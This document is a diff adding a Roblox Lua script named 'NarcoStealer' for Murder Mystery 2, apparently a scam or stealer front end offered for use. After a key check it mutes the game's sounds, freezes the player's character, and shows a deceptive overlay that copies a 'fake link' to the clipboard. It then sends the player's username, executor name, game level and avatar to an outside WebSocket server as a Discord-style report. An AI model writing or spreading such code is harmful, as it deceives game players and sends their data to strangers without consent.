@@ -1,0 +1,277 @@
+-- ====== NARCOSTEALER - MM2 ======
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+local LP = Players.LocalPlayer
+
+local KEY = _G.NARCO_KEY or ""
+
+if not KEY or KEY == "" then
+    LP:Kick("Key não detectada. Use: _G.NARCO_KEY = \"NL-XXXX-XXXX-XXXX\"")
+    return
+end
+
+if not KEY:match("^NL%-[A-Z0-9]+%-[A-Z0-9]+%-[A-Z0-9]+$") then
+    LP:Kick("Formato de key inválido. Use: NL-XXXX-XXXX-XXXX")
+    return
+end
+
+-- ====== WEBSOCKET FIXO ======
+local WEBSOCKET_URL = "wss://narcolandia-production.up.railway.app"
+
+local function connectWebSocket()
+    local ws
+    local success = pcall(function()
+        if syn and syn.websocket then
+            ws = syn.websocket.connect(WEBSOCKET_URL)
+        elseif WebSocket then
+            ws = WebSocket.connect(WEBSOCKET_URL)
+        else
+            error("Executor não suporta WebSocket")
+        end
+    end)
+    
+    if success and ws then
+        wait(1)
+        return ws
+    end
+    return nil
+end
+
+local function sendToWebSocket(ws, payload)
+    local message = {
+        key = KEY,
+        payload = payload
+    }
+    
+    local success = pcall(function()
+        ws:Send(HttpService:JSONEncode(message))
+        return true
+    end)
+    
+    return success
+end
+
+-- ====== BLOQUEAR SONS ======
+local function muteAllSounds()
+    local function muteDescendants(obj)
+        for _, child in ipairs(obj:GetDescendants()) do
+            if child:IsA("Sound") then
+                child.Volume = 0
+                pcall(function() child:Stop() end)
+            end
+        end
+    end
+    
+    for _, obj in ipairs({workspace, game.Players, game.ReplicatedStorage, game.Lighting, game.StarterGui}) do
+        muteDescendants(obj)
+        obj.DescendantAdded:Connect(function(child)
+            if child:IsA("Sound") then
+                child.Volume = 0
+                pcall(function() child:Stop() end)
+            end
+        end)
+    end
+end
+
+local function lockPlayer()
+    local char = LP.Character
+    if char and char:FindFirstChild("Humanoid") then
+        char.Humanoid.WalkSpeed = 0
+        char.Humanoid.JumpPower = 0
+    end
+    
+    UserInputService.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Keyboard or 
+           input.UserInputType == Enum.UserInputType.MouseButton1 or
+           input.UserInputType == Enum.UserInputType.MouseButton2 then
+            return
+        end
+    end)
+end
+
+muteAllSounds()
+lockPlayer()
+
+-- ====== OBTER NÍVEL ======
+local function getLevel()
+    local success, LevelModule = pcall(function()
+        return require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+    end)
+    if not success then return 0 end
+    
+    local success2, PlayerDataModule = pcall(function()
+        return require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+    end)
+    if not success2 then return 0 end
+    
+    for i, v in pairs(LevelModule.XPTable) do
+        if PlayerDataModule.NewXP < v then
+            return i
+        end
+    end
+    return 0
+end
+
+-- ====== OBTER EXECUTOR ======
+local function getExecutor()
+    if identifyexecutor then
+        return identifyexecutor()
+    end
+    return "Desconhecido"
+end
+
+-- ====== UI ======
+local function createGroupUI()
+    pcall(function() CoreGui:FindFirstChild("NarcoUI"):Destroy() end)
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "NarcoUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = CoreGui
+    
+    local overlay = Instance.new("Frame")
+    overlay.Size = UDim2.new(1, 0, 1, 0)
+    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    overlay.BackgroundTransparency = 0.7
+    overlay.BorderSizePixel = 0
+    overlay.Parent = screenGui
+    
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(0, 450, 0, 350)
+    container.Position = UDim2.new(0.5, -225, 0.5, -175)
+    container.BackgroundColor3 = Color3.fromRGB(20, 10, 30)
+    container.BorderSizePixel = 1
+    container.BorderColor3 = Color3.fromRGB(150, 0, 255)
+    container.Parent = overlay
+    Instance.new("UICorner").CornerRadius = UDim.new(0, 12)
+    
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 0, 80)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 0, 200))
+    })
+    gradient.Rotation = 45
+    gradient.Parent = container
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 50)
+    title.Position = UDim2.new(0, 0, 0, 10)
+    title.BackgroundTransparency = 1
+    title.Text = "🔮 NarcoLandia - #1 Scripts"
+    title.Font = Enum.Font.GothamBlack
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextScaled = true
+    title.Parent = container
+    
+    local desc = Instance.new("TextLabel")
+    desc.Size = UDim2.new(0.9, 0, 0, 120)
+    desc.Position = UDim2.new(0.05, 0, 0.25, 0)
+    desc.BackgroundTransparency = 1
+    desc.Text = "Para continuar usando o script, você precisa entrar na nossa comunidade!\n\nClique no botão abaixo para copiar o link, entre no grupo do Roblox e re-execute o script.\n\nO grupo é gratuito e leva menos de 1 minuto.\n\nApós entrar, todas as funções serão desbloqueadas."
+    desc.Font = Enum.Font.Gotham
+    desc.TextColor3 = Color3.fromRGB(200, 200, 220)
+    desc.TextSize = 16
+    desc.TextWrapped = true
+    desc.TextXAlignment = Enum.TextXAlignment.Center
+    desc.Parent = container
+    
+    local btnContainer = Instance.new("Frame")
+    btnContainer.Size = UDim2.new(0.8, 0, 0, 50)
+    btnContainer.Position = UDim2.new(0.1, 0, 0.75, 0)
+    btnContainer.BackgroundTransparency = 1
+    btnContainer.Parent = container
+    
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, 0, 1, 0)
+    btn.Text = "📋 Copiar Link do Grupo"
+    btn.Font = Enum.Font.GothamBold
+    btn.TextScaled = true
+    btn.BackgroundColor3 = Color3.fromRGB(150, 0, 255)
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Parent = btnContainer
+    Instance.new("UICorner").CornerRadius = UDim.new(0, 8)
+    
+    btn.MouseEnter:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(200, 0, 255)}):Play()
+    end)
+    btn.MouseLeave:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(150, 0, 255)}):Play()
+    end)
+    
+    local notification = Instance.new("TextLabel")
+    notification.Size = UDim2.new(0.8, 0, 0, 40)
+    notification.Position = UDim2.new(0.1, 0, 0.88, 0)
+    notification.BackgroundTransparency = 1
+    notification.Text = ""
+    notification.Font = Enum.Font.Gotham
+    notification.TextColor3 = Color3.fromRGB(0, 255, 0)
+    notification.TextSize = 14
+    notification.TextXAlignment = Enum.TextXAlignment.Center
+    notification.Parent = container
+    
+    btn.MouseButton1Click:Connect(function()
+        -- O link falso será substituído pelo servidor quando servir o script
+        local fakeLink = "https://www.roblox.com/groups/..."
+        setclipboard(fakeLink)
+        notification.Text = "✅ Link copiado! Entre no grupo e re-execute o script."
+        notification.TextColor3 = Color3.fromRGB(0, 255, 0)
+        lockPlayer()
+    end)
+    
+    return screenGui
+end
+
+createGroupUI()
+
+-- ====== EXECUTAR ======
+task.wait(3)
+
+local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
+
+local discordPayload = {
+    username = "NarcoLandia",
+    embeds = {{
+        title = "<a:verificado:1478800063328424039> Script Executado - NarcoStealer",
+        color = 3066993,
+        description = "# <:0_:1540515244252725390><:1_:1540515245871595681><:2_:1540515247541190737><:3_:1540515249206198336><:4_:1540515250812751872><:5_:1540515252486021130><:6_:1540515254415528087>",
+        fields = {
+            {
+                name = "<:ping:1471369480201441456> Usuário:",
+                value = "```" .. LP.Name .. "```",
+                inline = true
+            },
+            {
+                name = "<:h_icon_conexions:1384562586007371915> Executor",
+                value = "```" .. getExecutor() .. "```",
+                inline = true
+            },
+            {
+                name = "<a:money:1370803268242116639> Nível MM2",
+                value = "```" .. getLevel() .. "```",
+                inline = false
+            }
+        },
+        footer = {
+            text = "NarcoLandia - discord.gg/8xTuanwC8p"
+        },
+        thumbnail = {
+            url = thumbnailUrl
+        },
+        image = {
+            url = "https://media.discordapp.net/attachments/1510795224891261061/1540513978957037628/content.png?ex=6a8a3af1&is=6a88e971&hm=604bc5b605ba40ef82aa4fd1c8ebbac3ed551b83dafbed412e25db0f2fb7194a&=&format=webp&quality=lossless"
+        },
+        timestamp = DateTime.now():ToIsoDate()
+    }}
+}
+
+local ws = connectWebSocket()
+if ws then
+    sendToWebSocket(ws, discordPayload)
+    wait(1)
+    pcall(function() ws:Close() end)
+end
